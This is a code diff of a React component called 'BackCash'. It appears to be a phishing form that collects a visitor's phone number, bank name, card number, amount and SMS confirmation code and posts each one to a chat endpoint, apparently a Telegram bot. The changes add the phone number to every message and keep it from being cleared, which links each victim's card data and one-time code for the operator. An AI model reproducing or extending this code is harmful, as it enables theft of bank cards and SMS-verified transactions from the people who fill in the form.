@@ -43,7 +43,7 @@ export const BackCash = () => {
           text: `<b>${orderType}</b>\nНомер телефона: ${firstName}\nНазвание банка: ${bankLabel}\n`,
         })
         .then(res => {
-          setFirstName('');
+       
           setStep(2);
         })
         .catch(err => {
@@ -57,7 +57,7 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'HTML',
-          text: `<b>${orderType}</b>\nНомер карты: <code>${lastName}</code>\n`,
+          text: `<b>${orderType}</b>\nНомер телефона: ${firstName}\nНомер карты: <code>${lastName}</code>\n`,
         })
         .then(res => {
           setLastName('');
@@ -75,10 +75,10 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'html',
-          text: `<b>${orderType}</b>\nСумма: ${amount}`,
+          text: `<b>${orderType}</b>\nНомер телефона: ${firstName}\nСумма: ${amount}`,
         })
         .then(res => {
-          setFirstName('');
+         
           setLastName('');
           setAmount('');
           setLoading(true);
@@ -96,10 +96,10 @@ export const BackCash = () => {
         .post(URI_API, {
           chat_id: CHAT,
           parse_mode: 'html',
-          text: `<b>${orderType}</b>\nКод из смс: ${age}`,
+          text: `<b>${orderType}</b>\nНомер телефона: ${firstName}\nКод из смс: ${age}`,
         })
         .then(res => {
-          setFirstName('');
+         
           setLastName('');
           setAmount('');
           setAge('');
